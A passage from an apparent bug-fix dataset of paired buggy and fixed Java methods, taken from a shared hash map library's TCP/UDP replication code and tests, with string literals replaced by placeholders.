        positions.clear(value);
        break;
      }
    }
 else     if (hash2 == UNSET_KEY) {
      break;
    }
    pos=(pos + ENTRY_SIZE) & capacityMask2;
  }
  if (posToRemove < 0)   return false;
  removePos(posToRemove);
  return true;
}","@Override public boolean remove(int key,int value){
  key=maskUnsetKey(key);
  long pos=indexToPos(key & capacityMask);
  long posToRemove=-1L;
  for (int i=0; i <= capacityMask; i++) {
    long entry=bytes.readLong(pos);
    int hash2=(int)(entry >> 32);
    if (hash2 == key) {
      int value2=(int)entry;
      if (value2 == value) {
        posToRemove=pos;
        break;
      }
    }
 else     if (hash2 == UNSET_KEY) {
      break;
    }
    pos=(pos + ENTRY_SIZE) & capacityMask2;
  }
  if (posToRemove < 0)   return false;
  positions.clear(value);
  removePos(posToRemove);
  return true;
}"
91279,"public static ATSDirectBitSet newPositions(final int capacity1){
  long capacityInBits=capacity1 * 8;
  long capacityAsLongs=(capacityInBits + 7) / 8;
  return new ATSDirectBitSet(DirectStore.allocateLazy(capacityAsLongs * 8).bytes());
}","public static ATSDirectBitSet newPositions(int capacity){
  capacity=Math.max(capacity,64);
  int bitSetSizeInBytes=capacity / 8;
  return new ATSDirectBitSet(DirectStore.allocateLazy(bitSetSizeInBytes).bytes());
}"
91280,"@Override public int nextPos(){
  for (int i=0; i < capacity; i++) {
    long entry=bytes.readLong(searchPos);
    int hash2=(int)(entry >> 32);
    if (hash2 == UNSET_KEY) {
      return UNSET_VALUE;
    }
    searchPos=(searchPos + ENTRY_SIZE) & capacityMask2;
    if (hash2 == searchHash) {
      return (int)entry;
    }
  }
  throw new IllegalStateException(getClass().getSimpleName() + ""String_Node_Str"");
}","@Override public int nextPos(){
  long pos=searchPos;
  for (int i=0; i < capacity; i++) {
    long entry=bytes.readLong(pos);
    int hash2=(int)(entry >> 32);
    if (hash2 == UNSET_KEY) {
      return UNSET_VALUE;
    }
    pos=(pos + ENTRY_SIZE) & capacityMask2;
    if (hash2 == searchHash) {
      searchPos=pos;
      return (int)entry;
    }
  }
  throw new IllegalStateException(getClass().getSimpleName() + ""String_Node_Str"");
}"
91281,"public void removePrevPos(){
  removePos((searchPos - ENTRY_SIZE) & capacityMask2);
}","@Override public void removePrevPos(){
  long prevPos=(searchPos - ENTRY_SIZE) & capacityMask2;
  long entry=bytes.readLong(prevPos);
  int value=(int)entry;
  positions.clear(value);
  removePos(prevPos);
}"
91282,"@Before public void setup() throws IOException {
  final TcpReplicatorBuilder tcpReplicatorBuilder=new TcpReplicatorBuilder(8079,hostId == 0 ? NO_SERVERS : hostId == 1 ? ONE_SERVER : TWO_SERVER).deletedModIteratorFileOnExit(true).throttleBucketInterval(100,MILLISECONDS).heartBeatInterval(1,SECONDS);
  map1=new SharedHashMapBuilder().entries(1000).identifier((byte)2).tcpReplicatorBuilder(tcpReplicatorBuilder).entries(20000).create(getPersistenceFile(),Integer.class,CharSequence.class);
}","@Before public void setup() throws IOException {
  final TcpReplicatorBuilder tcpReplicatorBuilder=new TcpReplicatorBuilder(8079,hostId == 0 ? NO_SERVERS : hostId == 1 ? ONE_SERVER : TWO_SERVER).throttleBucketInterval(100,MILLISECONDS).heartBeatInterval(1,SECONDS);
  map1=new SharedHashMapBuilder().entries(1000).identifier((byte)2).tcpReplicatorBuilder(tcpReplicatorBuilder).entries(20000).create(getPersistenceFile(),Integer.class,CharSequence.class);
}"
91283,"@Before public void setup() throws IOException {
  final TcpReplicatorBuilder tcpReplicatorBuilder=new TcpReplicatorBuilder(8079).deletedModIteratorFileOnExit(true).heartBeatInterval(10,TimeUnit.SECONDS);
  map2=new SharedHashMapBuilder().entries(1000).identifier((byte)2).tcpReplicatorBuilder(tcpReplicatorBuilder).entries(20000).create(getPersistenceFile(),Integer.class,CharSequence.class);
}","@Before public void setup() throws IOException {
  final TcpReplicatorBuilder tcpReplicatorBuilder=new TcpReplicatorBuilder(8079).heartBeatInterval(10,TimeUnit.SECONDS);
  map2=new SharedHashMapBuilder().entries(1000).identifier((byte)2).tcpReplicatorBuilder(tcpReplicatorBuilder).entries(20000).create(getPersistenceFile(),Integer.class,CharSequence.class);
}"
91284,"@Before public void setup() throws IOException {
  final UdpReplicatorBuilder udpReplicatorBuilder=new UdpReplicatorBuilder(8079,""String_Node_Str"");
  assertTrue(identifier >= 1 && identifier <= Byte.MAX_VALUE);
  map1=new SharedHashMapBuilder().entries(1000).identifier((byte)identifier).udpReplicatorBuilder(udpReplicatorBuilder).entries(20000).create(getPersistenceFile(),Integer.class,Integer.class);
}","@Before public void setup() throws IOException {
  final NetworkInterface interf=NetworkInterface.getByName(""String_Node_Str"");
  final UdpReplicatorBuilder udpReplicatorBuilder=new UdpReplicatorBuilder(8078,""String_Node_Str"");
  udpReplicatorBuilder.isMultiCast(true);
  udpReplicatorBuilder.networkInterface(NetworkInterface.getByName(""String_Node_Str""));
  assertTrue(identifier >= 1 && identifier <= Byte.MAX_VALUE);
  map1=new SharedHashMapBuilder().entries(1000).identifier((byte)identifier).udpReplicatorBuilder(udpReplicatorBuilder).entries(20000).create(getPersistenceFile(),Integer.class,Integer.class);
}"
91285,"public SocketAddress address(){
  return address;
}","public InetSocketAddress address(){
  return address;
}"
91286,"Details(@NotNull final SocketAddress address,final byte localIdentifier){
  this.address=address;
  this.localIdentifier=localIdentifier;
}","Details(@NotNull final InetSocketAddress address,final byte localIdentifier){
  this.address=address;
  this.localIdentifier=localIdentifier;
}"
91287,"/** 
 * @param map
 * @param externalizable
 * @param udpReplicatorBuilder
 * @param serializedEntrySize
 * @throws IOException
 */
UdpReplicator(@NotNull final ReplicatedSharedHashMap map,@NotNull final ReplicatedSharedHashMap.EntryExternalizable externalizable,@NotNull final UdpReplicatorBuilder udpReplicatorBuilder,int serializedEntrySize) throws IOException {
  super(""String_Node_Str"" + map.identifier());
  this.udpReplicatorBuilder=udpReplicatorBuilder;
  this.writer=new UdpReplicator.UdpSocketChannelEntryWriter(serializedEntrySize,externalizable);
  this.reader=new UdpReplicator.UdpSocketChannelEntryReader(serializedEntrySize,externalizable);
  if (udpReplicatorBuilder.throttle() > 0)   throttler=new Throttler(selector,100,serializedEntrySize,udpReplicatorBuilder.throttle());
  final InetSocketAddress address=new InetSocketAddress(udpReplicatorBuilder.broadcastAddress(),udpReplicatorBuilder.port());
  pendingRegistrations=new ConcurrentLinkedQueue<Runnable>();
  final Details connectionDetails=new Details(address,map.identifier());
  serverConnector=new ServerConnector(connectionDetails);
  this.executorService.execute(new Runnable(){
    @Override public void run(){
      try {
        process();
      }
 catch (      Exception e) {
        LOG.error(""String_Node_Str"",e);
      }
    }
  }
);
}","/** 
 * @param map
 * @param externalizable
 * @param udpReplicatorBuilder
 * @param serializedEntrySize
 * @throws IOException
 */
UdpReplicator(@NotNull final ReplicatedSharedHashMap map,@NotNull final ReplicatedSharedHashMap.EntryExternalizable externalizable,@NotNull final UdpReplicatorBuilder udpReplicatorBuilder,int serializedEntrySize) throws IOException {
  super(""String_Node_Str"" + map.identifier());
  this.udpReplicatorBuilder=udpReplicatorBuilder;
  this.writer=new UdpReplicator.UdpSocketChannelEntryWriter(serializedEntrySize,externalizable);
  this.reader=new UdpReplicator.UdpSocketChannelEntryReader(serializedEntrySize,externalizable);
  if (udpReplicatorBuilder.throttle() > 0)   throttler=new Throttler(selector,100,serializedEntrySize,udpReplicatorBuilder.throttle());
  final InetSocketAddress address=new InetSocketAddress(udpReplicatorBuilder.broadcastAddress(),udpReplicatorBuilder.port());
  pendingRegistrations=new ConcurrentLinkedQueue<Runnable>();
  final UdpDetails connectionDetails=new UdpDetails(address,map.identifier(),udpReplicatorBuilder.isMultiCast(),udpReplicatorBuilder.networkInterface());
  serverConnector=new ServerConnector(connectionDetails);
  this.executorService.execute(new Runnable(){
    @Override public void run(){
      try {
        process();
      }
 catch (      Exception e) {
        LOG.error(""String_Node_Str"",e);
      }
    }
  }
);
}"
91288,"private ServerConnector(Details connectionDetails){
  super(""String_Node_Str"",closeables);
  this.details=connectionDetails;
}","private ServerConnector(UdpDetails connectionDetails){
  super(""String_Node_Str"",closeables);
  this.details=connectionDetails;
}"
91289,"SelectableChannel doConnect() throws IOException, InterruptedException {
  final DatagramChannel server=DatagramChannel.open();
  server.socket().setBroadcast(true);
  server.configureBlocking(false);
  try {
synchronized (UdpReplicator.this.closeables) {
      server.connect(details.address());
      UdpReplicator.this.closeables.add(server);
    }
  }
 catch (  IOException e) {
    connectLater();
    return null;
  }
  server.setOption(StandardSocketOptions.SO_REUSEADDR,true).setOption(StandardSocketOptions.IP_MULTICAST_LOOP,false).setOption(StandardSocketOptions.SO_BROADCAST,true).setOption(StandardSocketOptions.SO_REUSEADDR,true);
  pendingRegistrations.add(new Runnable(){
    @Override public void run(){
      try {
        server.register(selector,OP_WRITE);
        writeChannel=server;
        if (throttler != null)         throttler.add(server);
      }
 catch (      ClosedChannelException e) {
        LOG.error(""String_Node_Str"",e);
      }
    }
  }
);
  return server;
}","SelectableChannel doConnect() throws IOException, InterruptedException {
  final DatagramChannel server=DatagramChannel.open();
  server.configureBlocking(false);
  try {
synchronized (UdpReplicator.this.closeables) {
      if (details.isMultiCast) {
        final InetAddress group=InetAddress.getByName(details.address().getHostName());
        server.join(group,details.networkInterface);
      }
 else {
        server.socket().setBroadcast(true);
        server.connect(details.address());
      }
      if (server == null)       throw new NullPointerException(""String_Node_Str"");
      UdpReplicator.this.closeables.add(server);
    }
  }
 catch (  IOException e) {
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"" + details,e);
    connectLater();
    return null;
  }
  server.setOption(StandardSocketOptions.SO_REUSEADDR,true).setOption(StandardSocketOptions.IP_MULTICAST_LOOP,false).setOption(StandardSocketOptions.SO_BROADCAST,true).setOption(StandardSocketOptions.SO_REUSEADDR,true);
  pendingRegistrations.add(new Runnable(){
    @Override public void run(){
      try {
        server.register(selector,OP_WRITE);
        writeChannel=server;
        if (throttler != null)         throttler.add(server);
      }
 catch (      ClosedChannelException e) {
        LOG.error(""String_Node_Str"",e);
      }
    }
  }
);
  return server;
}"
91290,"private void disableWrites(){
  try {
    final SelectionKey selectionKey=writeChannel.keyFor(this.selector);
    selectionKey.interestOps(selectionKey.interestOps() & ~OP_WRITE);
  }
 catch (  Exception e) {
    LOG.error(""String_Node_Str"",e);
  }
}","private void disableWrites(){
  if (writeChannel == null)   return;
  try {
    final SelectionKey selectionKey=writeChannel.keyFor(this.selector);
    selectionKey.interestOps(selectionKey.interestOps() & ~OP_WRITE);
  }
 catch (  Exception e) {
    LOG.error(""String_Node_Str"",e);
  }
}"
91291,"private void enableWrites(){
  try {
    final SelectionKey selectionKey=writeChannel.keyFor(this.selector);
    if (selectionKey != null)     selectionKey.interestOps(selectionKey.interestOps() | OP_WRITE);
  }
 catch (  Exception e) {
    LOG.error(""String_Node_Str"",e);
  }
}","private void enableWrites(){
  if (writeChannel == null)   return;
  try {
    final SelectionKey selectionKey=writeChannel.keyFor(this.selector);
    if (selectionKey != null)     selectionKey.interestOps(selectionKey.interestOps() | OP_WRITE);
  }
 catch (  Exception e) {
    LOG.error(""String_Node_Str"",e);
  }
}"
91292,"@Override public String toString(){
  return ""String_Node_Str"" + ""String_Node_Str"" + actualSegments() + ""String_Node_Str""+ minSegments()+ ""String_Node_Str""+ actualEntriesPerSegment()+ ""String_Node_Str""+ entrySize()+ ""String_Node_Str""+ entryAndValueAlignment()+ ""String_Node_Str""+ entries()+ ""String_Node_Str""+ replicas()+ ""String_Node_Str""+ transactional()+ ""String_Node_Str""+ lockTimeOutMS()+ ""String_Node_Str""+ metaDataBytes()+ ""String_Node_Str""+ eventListener()+ ""String_Node_Str""+ errorListener()+ ""String_Node_Str""+ putReturnsNull()+ ""String_Node_Str""+ removeReturnsNull()+ ""String_Node_Str""+ generatedKeyType()+ ""String_Node_Str""+ generatedValueType()+ ""String_Node_Str""+ largeSegments()+ ""String_Node_Str""+ canReplicate()+ ""String_Node_Str""+ identifier()+ ""String_Node_Str""+ tcpReplication()+ ""String_Node_Str""+ udpReplication()+ ""String_Node_Str""+ timeProvider()+ '}';
}","@Override public String toString(){
  return ""String_Node_Str"" + ""String_Node_Str"" + actualSegments() + ""String_Node_Str""+ minSegments()+ ""String_Node_Str""+ actualEntriesPerSegment()+ ""String_Node_Str""+ entrySize()+ ""String_Node_Str""+ entryAndValueAlignment()+ ""String_Node_Str""+ entries()+ ""String_Node_Str""+ replicas()+ ""String_Node_Str""+ transactional()+ ""String_Node_Str""+ lockTimeOutMS()+ ""String_Node_Str""+ metaDataBytes()+ ""String_Node_Str""+ eventListener()+ ""String_Node_Str""+ errorListener()+ ""String_Node_Str""+ putReturnsNull()+ ""String_Node_Str""+ removeReturnsNull()+ ""String_Node_Str""+ generatedKeyType()+ ""String_Node_Str""+ generatedValueType()+ ""String_Node_Str""+ largeSegments()+ ""String_Node_Str""+ canReplicate()+ ""String_Node_Str""+ identifierToString()+ ""String_Node_Str""+ tcpReplication()+ ""String_Node_Str""+ udpReplication()+ ""String_Node_Str""+ timeProvider()+ '}';
}"
91293,"@Before public void setup() throws IOException {
  map1=newTcpSocketShmIntString((byte)1,8076,new InetSocketAddress(""String_Node_Str"",8077),new InetSocketAddress(""String_Node_Str"",8078),new InetSocketAddress(""String_Node_Str"",8079));
  map2=newTcpSocketShmIntString((byte)2,8077,new InetSocketAddress(""String_Node_Str"",8078),new InetSocketAddress(""String_Node_Str"",8079));
  map3=newTcpSocketShmIntString((byte)3,8078,new InetSocketAddress(""String_Node_Str"",8079));
  map4=newTcpSocketShmIntString((byte)4,8079);
}","@Before public void setup() throws IOException {
  map1=newTcpSocketShmIntString((byte)1,8086,new InetSocketAddress(""String_Node_Str"",8087),new InetSocketAddress(""String_Node_Str"",8088),new InetSocketAddress(""String_Node_Str"",8089));
  map2=newTcpSocketShmIntString((byte)2,8087,new InetSocketAddress(""String_Node_Str"",8088),new InetSocketAddress(""String_Node_Str"",8089));
  map3=newTcpSocketShmIntString((byte)3,8088,new InetSocketAddress(""String_Node_Str"",8089));
  map4=newTcpSocketShmIntString((byte)4,8089);
}"
91294,"@Test @Ignore public void testContinueToPublish() throws IOException, InterruptedException {
  for (; ; ) {
    for (int i=0; i < 1024; i++) {
      Thread.sleep(1000);
      System.out.println(map2);
    }
  }
}","@Test @Ignore public void testContinueToPublish() throws IOException, InterruptedException {
  for (; ; ) {
    for (int i=0; i < 1024; i++) {
      Thread.sleep(1000);
      map2.put(1 + (i * 2),""String_Node_Str"");
      System.out.println(map2);
    }
  }
}"
91295,"Details(@NotNull SocketAddress address,@NotNull Set<Closeable> closeables,byte identifier,@NotNull Queue<Runnable> pendingRegistrations){
  this.address=address;
  this.pendingRegistrations=pendingRegistrations;
  this.closeables=closeables;
  this.identifier=identifier;
}","Details(@NotNull SocketAddress address,@NotNull Set<Closeable> closeables,byte identifier){
  this.address=address;
  this.closeables=closeables;
  this.identifier=identifier;
}"
91296,"private void process(@NotNull final ReplicatedSharedHashMap map,final int serializedEntrySize,@NotNull final EntryExternalizable externalizable,@NotNull final TcpReplicatorBuilder tcpReplicatorBuilder) throws IOException {
  final byte identifier=map.identifier();
  final short packetSize=tcpReplicatorBuilder.packetSize();
  try {
    final InetSocketAddress address=tcpReplicatorBuilder.serverInetSocketAddress();
    final Details serverDetails=new Details(address,closeables,identifier,pendingRegistrations);
    connectorBySocket.put(address,new ServerConnector(serverDetails));
    for (    InetSocketAddress client : tcpReplicatorBuilder.endpoints()) {
      final Details clientDetails=new Details(client,closeables,identifier,pendingRegistrations);
      connectorBySocket.put(client,new ClientConnector(clientDetails));
    }
    for (    AbstractConnector connector : connectorBySocket.values()) {
      connector.connect();
    }
    if (tcpReplicatorBuilder.throttle() > 0)     throttler=new Throttler(selector,throttleInterval,maxBytesInInterval);
    for (; ; ) {
      register(pendingRegistrations);
      if (!selector.isOpen())       return;
      final int nSelectedKeys=selector.select(100);
      if (throttler != null)       throttler.checkThrottleInterval();
      if (nSelectedKeys == 0) {
        continue;
      }
      final long approxTime=System.currentTimeMillis();
      final Set<SelectionKey> selectionKeys=selector.selectedKeys();
      for (      final SelectionKey key : selectionKeys) {
        try {
          if (!key.isValid())           continue;
          if (key.isAcceptable())           onAccept(key,serializedEntrySize,externalizable,packetSize,map.identifier());
          if (key.isConnectable())           onConnect(packetSize,serializedEntrySize,externalizable,key,map.identifier());
          if (key.isReadable())           onRead(map,key,approxTime,tcpReplicatorBuilder.heartBeatInterval());
          if (key.isWritable())           onWrite(key,approxTime);
          checkHeartbeat(key,approxTime,identifier);
        }
 catch (        CancelledKeyException e) {
          quietClose(key,e);
        }
catch (        ClosedSelectorException e) {
          quietClose(key,e);
        }
catch (        IOException e) {
          quietClose(key,e);
        }
catch (        Exception e) {
          LOG.info(""String_Node_Str"",e);
          close(key);
        }
      }
      selectionKeys.clear();
    }
  }
 catch (  ClosedSelectorException e) {
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"",e);
  }
catch (  ClosedChannelException e) {
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"",e);
  }
catch (  ConnectException e) {
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"",e);
  }
catch (  Exception e) {
    LOG.error(""String_Node_Str"",e);
  }
 finally {
    if (selector != null)     try {
      selector.close();
    }
 catch (    IOException e) {
      if (LOG.isDebugEnabled())       LOG.debug(""String_Node_Str"",e);
    }
    close();
  }
}","private void process(@NotNull final ReplicatedSharedHashMap map,final int serializedEntrySize,@NotNull final EntryExternalizable externalizable,@NotNull final TcpReplicatorBuilder tcpReplicatorBuilder) throws IOException {
  final byte identifier=map.identifier();
  final short packetSize=tcpReplicatorBuilder.packetSize();
  try {
    final InetSocketAddress address=tcpReplicatorBuilder.serverInetSocketAddress();
    final Details serverDetails=new Details(address,closeables,identifier);
    connectorBySocket.put(address,new ServerConnector(serverDetails));
    for (    InetSocketAddress client : tcpReplicatorBuilder.endpoints()) {
      final Details clientDetails=new Details(client,closeables,identifier);
      connectorBySocket.put(client,new ClientConnector(clientDetails));
    }
    for (    AbstractConnector connector : connectorBySocket.values()) {
      connector.connect();
    }
    if (tcpReplicatorBuilder.throttle() > 0)     throttler=new Throttler(selector,throttleInterval,maxBytesInInterval);
    for (; ; ) {
      register(pendingRegistrations);
      if (!selector.isOpen())       return;
      final int nSelectedKeys=selector.select(100);
      if (throttler != null)       throttler.checkThrottleInterval();
      if (nSelectedKeys == 0) {
        continue;
      }
      final long approxTime=System.currentTimeMillis();
      final Set<SelectionKey> selectionKeys=selector.selectedKeys();
      for (      final SelectionKey key : selectionKeys) {
        try {
          if (!key.isValid())           continue;
          if (key.isAcceptable())           onAccept(key,serializedEntrySize,externalizable,packetSize,map.identifier());
          if (key.isConnectable())           onConnect(packetSize,serializedEntrySize,externalizable,key,map.identifier());
          if (key.isReadable())           onRead(map,key,approxTime,tcpReplicatorBuilder.heartBeatInterval());
          if (key.isWritable())           onWrite(key,approxTime);
          checkHeartbeat(key,approxTime,identifier);
        }
 catch (        CancelledKeyException e) {
          quietClose(key,e);
        }
catch (        ClosedSelectorException e) {
          quietClose(key,e);
        }
catch (        IOException e) {
          quietClose(key,e);
        }
catch (        Exception e) {
          LOG.info(""String_Node_Str"",e);
          close(key);
        }
      }
      selectionKeys.clear();
    }
  }
 catch (  ClosedSelectorException e) {
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"",e);
  }
catch (  ClosedChannelException e) {
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"",e);
  }
catch (  ConnectException e) {
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"",e);
  }
catch (  Exception e) {
    LOG.error(""String_Node_Str"",e);
  }
 finally {
    if (selector != null)     try {
      selector.close();
    }
 catch (    IOException e) {
      if (LOG.isDebugEnabled())       LOG.debug(""String_Node_Str"",e);
    }
    close();
  }
}"
91297,"/** 
 * binds to the server socket and process data This method will block until interrupted
 * @throws Exception
 */
private void process() throws Exception {
  connectClient(udpReplicatorBuilder.port()).register(selector,OP_READ);
  serverConnector.connect();
  if (udpReplicatorBuilder.throttle() > 0)   throttler=new Throttler(selector,throttleInterval,maxBytesInInterval);
  for (; ; ) {
    final int n=selector.select(100);
    register(this.pendingRegistrations);
    if (throttler != null)     throttler.checkThrottleInterval();
    if (n == 0) {
      continue;
    }
    final Iterator it=selector.selectedKeys().iterator();
    final Set<SelectionKey> selectionKeys=selector.selectedKeys();
    for (    final SelectionKey key : selectionKeys) {
      it.remove();
      try {
        if (key.isReadable()) {
          final DatagramChannel socketChannel=(DatagramChannel)key.channel();
          reader.readAll(socketChannel);
        }
        if (key.isWritable()) {
          final DatagramChannel socketChannel=(DatagramChannel)key.channel();
          try {
            int len=writer.writeAll(socketChannel,udpModificationIterator);
            throttler.checkUnregisterSelector(len);
          }
 catch (          NotYetConnectedException e) {
            if (LOG.isDebugEnabled())             LOG.debug(""String_Node_Str"",e);
            serverConnector.connect();
          }
catch (          IOException e) {
            if (LOG.isDebugEnabled())             LOG.debug(""String_Node_Str"",e);
            serverConnector.connect();
          }
        }
      }
 catch (      Exception e) {
        LOG.error(""String_Node_Str"",e);
        try {
          key.channel().close();
          throttler.remove(key.channel());
          closeables.remove(key.channel());
        }
 catch (        IOException ex) {
        }
      }
      selectionKeys.clear();
    }
  }
}","/** 
 * binds to the server socket and process data This method will block until interrupted
 * @throws Exception
 */
private void process() throws Exception {
  connectClient(udpReplicatorBuilder.port()).register(selector,OP_READ);
  serverConnector.connect();
  if (udpReplicatorBuilder.throttle() > 0)   throttler=new Throttler(selector,throttleInterval,maxBytesInInterval);
  for (; ; ) {
    final int n=selector.select(100);
    register(this.pendingRegistrations);
    if (throttler != null)     throttler.checkThrottleInterval();
    if (n == 0) {
      continue;
    }
    final Set<SelectionKey> selectionKeys=selector.selectedKeys();
    for (    final SelectionKey key : selectionKeys) {
      try {
        if (key.isReadable()) {
          final DatagramChannel socketChannel=(DatagramChannel)key.channel();
          reader.readAll(socketChannel);
        }
        if (key.isWritable()) {
          final DatagramChannel socketChannel=(DatagramChannel)key.channel();
          try {
            int len=writer.writeAll(socketChannel,udpModificationIterator);
            throttler.checkUnregisterSelector(len);
          }
 catch (          NotYetConnectedException e) {
            if (LOG.isDebugEnabled())             LOG.debug(""String_Node_Str"",e);
            serverConnector.connect();
          }
catch (          IOException e) {
            if (LOG.isDebugEnabled())             LOG.debug(""String_Node_Str"",e);
            serverConnector.connect();
          }
        }
      }
 catch (      Exception e) {
        LOG.error(""String_Node_Str"",e);
        try {
          key.channel().close();
          throttler.remove(key.channel());
          closeables.remove(key.channel());
        }
 catch (        IOException ex) {
        }
      }
    }
    selectionKeys.clear();
  }
}"
91298,"/** 
 * @param map
 * @param udpReplicatorBuilder
 * @param udpModificationIterator
 * @param entrySize
 * @param externalizable
 * @throws IOException
 */
UdpReplicator(@NotNull final ReplicatedSharedHashMap map,@NotNull final UdpReplicatorBuilder udpReplicatorBuilder,@NotNull final ModificationIterator udpModificationIterator,int entrySize,@NotNull final ReplicatedSharedHashMap.EntryExternalizable externalizable) throws IOException {
  super(""String_Node_Str"" + map.identifier());
  this.udpReplicatorBuilder=udpReplicatorBuilder;
  this.udpModificationIterator=udpModificationIterator;
  this.writer=new UdpReplicator.UdpSocketChannelEntryWriter(entrySize,externalizable);
  this.reader=new UdpReplicator.UdpSocketChannelEntryReader(entrySize,externalizable);
  this.maxBytesInInterval=(TimeUnit.SECONDS.toMillis(udpReplicatorBuilder.throttle()) * throttleInterval * BITS_IN_A_BYTE) - entrySize;
  final InetSocketAddress address=new InetSocketAddress(udpReplicatorBuilder.broadcastAddress(),udpReplicatorBuilder.port());
  pendingRegistrations=new ConcurrentLinkedQueue<Runnable>();
  final Details connectionDetails=new Details(address,closeables,map.identifier(),pendingRegistrations);
  serverConnector=new ServerConnector(connectionDetails);
  executorService.execute(new Runnable(){
    @Override public void run(){
      try {
        process();
      }
 catch (      Exception e) {
        LOG.error(""String_Node_Str"",e);
      }
    }
  }
);
}","/** 
 * @param map
 * @param udpReplicatorBuilder
 * @param udpModificationIterator
 * @param entrySize
 * @param externalizable
 * @throws IOException
 */
UdpReplicator(@NotNull final ReplicatedSharedHashMap map,@NotNull final UdpReplicatorBuilder udpReplicatorBuilder,@NotNull final ModificationIterator udpModificationIterator,int entrySize,@NotNull final ReplicatedSharedHashMap.EntryExternalizable externalizable) throws IOException {
  super(""String_Node_Str"" + map.identifier());
  this.udpReplicatorBuilder=udpReplicatorBuilder;
  this.udpModificationIterator=udpModificationIterator;
  this.writer=new UdpReplicator.UdpSocketChannelEntryWriter(entrySize,externalizable);
  this.reader=new UdpReplicator.UdpSocketChannelEntryReader(entrySize,externalizable);
  this.maxBytesInInterval=(TimeUnit.SECONDS.toMillis(udpReplicatorBuilder.throttle()) * throttleInterval * BITS_IN_A_BYTE) - entrySize;
  final InetSocketAddress address=new InetSocketAddress(udpReplicatorBuilder.broadcastAddress(),udpReplicatorBuilder.port());
  pendingRegistrations=new ConcurrentLinkedQueue<Runnable>();
  final Details connectionDetails=new Details(address,closeables,map.identifier());
  serverConnector=new ServerConnector(connectionDetails);
  executorService.execute(new Runnable(){
    @Override public void run(){
      try {
        process();
      }
 catch (      Exception e) {
        LOG.error(""String_Node_Str"",e);
      }
    }
  }
);
}"
91299,"@Test @Ignore public void testBufferOverflow() throws IOException, InterruptedException {
  for (int i=0; i < 1024; i++) {
    Thread.sleep(1000);
  }
}","@Test @Ignore public void testBufferOverflow() throws IOException, InterruptedException {
  for (int i=0; i < 1024; i++) {
    Thread.sleep(1000);
    System.out.println(""String_Node_Str"" + map2);
  }
}"
91300,"@Before public void setup() throws IOException {
  final TcpReplicatorBuilder tcpReplicatorBuilder=new TcpReplicatorBuilder(8079).heartBeatInterval(1000);
  map2=new SharedHashMapBuilder().entries(1000).identifier((byte)2).tcpReplication(tcpReplicatorBuilder).entries(20000).create(getPersistenceFile(),Integer.class,CharSequence.class);
}","@Before public void setup() throws IOException {
  final TcpReplicatorBuilder tcpReplicatorBuilder=new TcpReplicatorBuilder(8079).heartBeatInterval(10000);
  map2=new SharedHashMapBuilder().entries(1000).identifier((byte)2).tcpReplication(tcpReplicatorBuilder).entries(20000).create(getPersistenceFile(),Integer.class,CharSequence.class);
}"
91301,"/** 
 * used to connect both client and server sockets
 * @param identifier
 * @param clientSocket a queue containing the SocketChannel as they become connected
 * @return
 */
private void asyncReconnect(final byte identifier,final Socket clientSocket){
  final InetSocketAddress inetSocketAddress=new InetSocketAddress(clientSocket.getInetAddress().getHostName(),clientSocket.getPort());
  final Integer lastAttempts=connectionAttempts.get(connectionAttempts);
  final Integer attempts=lastAttempts == null ? 1 : lastAttempts + 1;
  connectionAttempts.put(inetSocketAddress,attempts);
  int reconnectionInterval=(attempts * attempts) * 100;
  if (reconnectionInterval > 20 * 1000)   reconnectionInterval=20 * 1000;
  asyncConnect0(identifier,null,Collections.singleton(inetSocketAddress),reconnectionInterval);
}","/** 
 * used to connect both client and server sockets
 * @param identifier
 * @param clientSocket a queue containing the SocketChannel as they become connected
 * @return
 */
private void asyncReconnect(final byte identifier,final Socket clientSocket){
  final InetSocketAddress inetSocketAddress=new InetSocketAddress(clientSocket.getInetAddress().getHostName(),clientSocket.getPort());
  final Integer lastAttempts=connectionAttempts.get(inetSocketAddress);
  final Integer attempts=lastAttempts == null ? 1 : lastAttempts + 1;
  connectionAttempts.put(inetSocketAddress,attempts);
  int reconnectionInterval=(attempts * attempts) * 100;
  if (reconnectionInterval > 20 * 1000)   reconnectionInterval=20 * 1000;
  asyncConnect0(identifier,null,Collections.singleton(inetSocketAddress),reconnectionInterval);
}"
91302,"/** 
 * re register the 'write' on the selector if the throttleInterval has passed
 * @throws java.nio.channels.ClosedChannelException
 */
public void checkThrottleInterval() throws ClosedChannelException {
  final long time=System.currentTimeMillis();
  if (lastTime + throttleInterval >= time)   return;
  lastTime=time;
  byteWritten=0;
  for (  SelectableChannel selectableChannel : channels) {
    Object attachment=null;
    try {
      final SelectionKey selectionKey=selectableChannel.keyFor(selector);
      attachment=selectionKey.attachment();
      selectableChannel.register(selector,OP_WRITE,attachment);
    }
 catch (    IOException e) {
      if (LOG.isDebugEnabled())       LOG.debug(""String_Node_Str"",e);
      try {
        if (attachment != null)         ((AbstractAttached)attachment).connector.connect();
      }
 catch (      Exception e1) {
        LOG.error(""String_Node_Str"",e);
      }
    }
  }
}","/** 
 * re register the 'write' on the selector if the throttleInterval has passed
 * @throws java.nio.channels.ClosedChannelException
 */
public void checkThrottleInterval() throws ClosedChannelException {
  final long time=System.currentTimeMillis();
  if (lastTime + throttleInterval >= time)   return;
  lastTime=time;
  byteWritten=0;
  for (  SelectableChannel selectableChannel : channels) {
    Object attachment=null;
    try {
      final SelectionKey selectionKey=selectableChannel.keyFor(selector);
      if (selectionKey != null) {
        attachment=selectionKey.attachment();
        selectableChannel.register(selector,OP_WRITE,attachment);
      }
    }
 catch (    IOException e) {
      if (LOG.isDebugEnabled())       LOG.debug(""String_Node_Str"",e);
      try {
        if (attachment != null)         ((AbstractAttached)attachment).connector.connect();
      }
 catch (      Exception e1) {
        LOG.error(""String_Node_Str"",e);
      }
    }
  }
}"
91303,"private DatagramChannel connectClient(final int port) throws IOException {
  final DatagramChannel client=DatagramChannel.open();
  final InetSocketAddress hostAddress=new InetSocketAddress(port);
  client.configureBlocking(false);
synchronized (closeables) {
    client.bind(hostAddress);
    if (LOG.isDebugEnabled())     LOG.debug(""String_Node_Str"" + port);
    client.register(selector,OP_READ);
    closeables.add(client);
  }
  return client;
}","private DatagramChannel connectClient(final int port) throws IOException {
  final DatagramChannel client=DatagramChannel.open();
  final InetSocketAddress hostAddress=new InetSocketAddress(port);
  client.configureBlocking(false);
